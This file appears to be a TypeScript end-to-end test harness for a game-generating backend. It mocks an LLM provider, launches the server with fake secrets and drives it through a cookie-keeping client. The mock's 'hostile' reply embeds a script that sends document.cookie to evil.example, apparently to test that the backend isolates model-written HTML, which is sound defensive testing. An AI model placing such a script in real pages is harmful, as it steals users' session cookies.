/* eslint-disable @typescript-eslint/no-explicit-any -- response bodies are untyped JSON in this black-box harness */
import { spawn, type ChildProcess } from 'node:child_process';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';

export const BACKEND_DIR = fileURLToPath(new URL('..', import.meta.url));

export async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const s = http.createServer().listen(0, '127.0.0.1', () => {
      const { port } = s.address() as AddressInfo;
      s.close(() => resolve(port));
    });
    s.on('error', reject);
  });
}

/** A stand-in for the model provider: an OpenAI-style endpoint whose reply the test chooses. */
export class MockLlm {
  mode: 'good' | 'hostile' = 'good';
  calls = 0;
  html = { good: '', hostile: '<!doctype html><html><body><canvas></canvas><script>fetch("https://evil.example/steal?c="+document.cookie)</script></body></html>' };
  private server = http.createServer((req, res) => {
    req.resume();
    req.on('end', () => {
      this.calls++;
      const content = '```html\n' + this.html[this.mode] + '\n```';
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ model: 'mock-model', choices: [{ message: { content } }], usage: { prompt_tokens: 120, completion_tokens: 480 } }));
    });
  });
  port = 0;
  async start(goodHtml: string): Promise<void> {
    this.html.good = goodHtml;
    await new Promise<void>((r) => this.server.listen(0, '127.0.0.1', r));
    this.port = (this.server.address() as AddressInfo).port;
  }
  stop(): Promise<void> {
    return new Promise((r) => this.server.close(() => r()));
  }
}

/** The real backend process, configured to use the mock model and fakes for everything else. */
export class BackendProcess {
  port = 0;
  private child: ChildProcess | null = null;
  output = '';

  get base(): string {
    return `http://127.0.0.1:${this.port}`;
  }

  async start(llmPort: number): Promise<void> {
    this.port = await freePort();
    // Start from this process's environment but remove anything that would reach a real service.
    const env: NodeJS.ProcessEnv = { ...process.env };
    for (const k of Object.keys(env)) if (/^(SUPABASE|STRIPE|OPENAI|RAWG|RESEND|LLM|AUTH_DEV|AFFILIATE|MODERATION)/.test(k)) delete env[k];
    Object.assign(env, {
      NODE_ENV: 'development',
      PORT: String(this.port),
      SITE_URL: 'http://localhost:3000',
      // 127.0.0.1:<port> is the game origin; localhost:<port> (same server, different host) must not serve games.
      GAME_ORIGIN: this.base,
      COOKIE_SECRET: 'e2e-cookie-secret-e2e-cookie-secret',
      CRON_SECRET: 'e2e-cron-secret-e2e-cron-secret',
      FOUNDER_EMAILS: 'boss@worldsmade.example',
      LLM_API_URL: `http://127.0.0.1:${llmPort}/v1/chat/completions`,
      LLM_API_KEY: 'e2e-key',
      LLM_MODEL: 'mock-model',
    });
    this.child = spawn(process.execPath, ['--import', 'tsx', 'src/server.ts'], { cwd: BACKEND_DIR, env, stdio: ['ignore', 'pipe', 'pipe'] });
    this.child.stdout?.on('data', (d) => (this.output += String(d)));
    this.child.stderr?.on('data', (d) => (this.output += String(d)));
    for (let i = 0; i < 100; i++) {
      try {
        if ((await fetch(`${this.base}/api/health`)).ok) return;
      } catch {
        /* not up yet */
      }
      await new Promise((r) => setTimeout(r, 150));
    }
    throw new Error(`backend did not start:\n${this.output}`);
  }

  async stop(): Promise<void> {
    if (!this.child) return;
    const child = this.child;
    await new Promise<void>((resolve) => {
      child.once('exit', () => resolve());
      child.kill();
      setTimeout(resolve, 3000);
    });
  }
}

/** A browser-like client: keeps cookies, sends the bearer token, returns JSON. */
export class Client {
  private cookies = new Map<string, string>();
  token: string | null = null;
  userId = '';
  constructor(private readonly base: string) {}

  async call(method: string, path: string, body?: unknown): Promise<{ status: number; json: any; headers: Headers }> {
    const res = await fetch(`${this.base}${path}`, {
      method,
      headers: {
        ...(body === undefined ? {} : { 'content-type': 'application/json' }),
        ...(this.token ? { authorization: `Bearer ${this.token}` } : {}),
        ...(this.cookies.size ? { cookie: [...this.cookies].map(([k, v]) => `${k}=${v}`).join('; ') } : {}),
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    for (const c of res.headers.getSetCookie()) {
      const [pair = ''] = c.split(';');
      const i = pair.indexOf('=');
      this.cookies.set(pair.slice(0, i), pair.slice(i + 1));
    }
    const text = await res.text();
    let json: unknown;
    try {
      json = JSON.parse(text);
    } catch {
      json = text;
    }
    return { status: res.status, json, headers: res.headers };
  }

  /** The real sign-up path: age answer, login, profile. */
  async signUp(email: string, yearsOld = 30, displayName = 'E2E Player'): Promise<void> {
    await this.call('POST', '/api/age', { birthYear: new Date().getUTCFullYear() - yearsOld - 1, country: 'US' });
    const login = await this.call('POST', '/api/auth/dev-token', { email });
    this.token = login.json.token;
    this.userId = login.json.userId;
    const profile = await this.call('POST', '/api/me/profile', { displayName });
    if (profile.status !== 201) throw new Error(`sign-up failed: ${profile.status} ${JSON.stringify(profile.json)}`);
  }
}

/** A raw GET with an explicit Host header, because fetch will not let us pretend to be another host. */
export function rawGet(port: number, path: string, host: string): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path, method: 'GET', headers: { host } }, (res) => {
      let body = '';
      res.on('data', (d) => (body += d));
      res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.end();
  });
}
